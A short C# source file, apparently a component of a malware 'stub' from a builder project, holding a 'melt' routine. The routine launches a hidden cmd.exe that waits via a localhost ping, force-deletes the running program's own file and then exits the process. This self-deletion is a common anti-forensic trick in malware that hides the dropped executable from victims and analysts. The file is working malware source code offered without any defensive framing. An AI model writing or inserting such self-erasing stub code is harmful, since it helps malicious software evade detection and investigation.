using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace DCB.stub.components
{
    internal class melt
    {
        internal static void meltfile()
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c ping localhost && del /F /A h \"{Assembly.GetCallingAssembly().Location}\" && pause";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
            }

            Environment.Exit(0);
        }
    }
}
